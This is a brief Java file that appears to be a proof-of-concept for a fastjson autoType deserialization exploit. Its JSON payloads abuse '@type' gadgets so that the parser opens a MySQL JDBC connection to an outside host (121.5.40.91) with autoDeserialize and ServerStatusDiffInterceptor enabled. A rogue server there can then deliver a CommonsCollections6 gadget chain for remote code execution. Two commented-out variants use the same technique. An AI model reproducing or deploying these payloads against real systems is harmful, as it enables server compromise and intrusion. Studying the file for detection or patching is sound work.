import com.alibaba.fastjson.JSON;

import com.mysql.jdbc.JDBC4Connection;

public class Test1 {
    public static void main(String[] args){
        String json2="{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"121.5.40.91\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"CommonsCollections6\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } }";
//        String json2="{\"name\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://121.5.40.91:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false\" } } }}";
//        String json2="{ \"name\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false\" } } }}";

        Object obj1 = JSON.parse(json2);
        System.out.println(obj1);
    }
}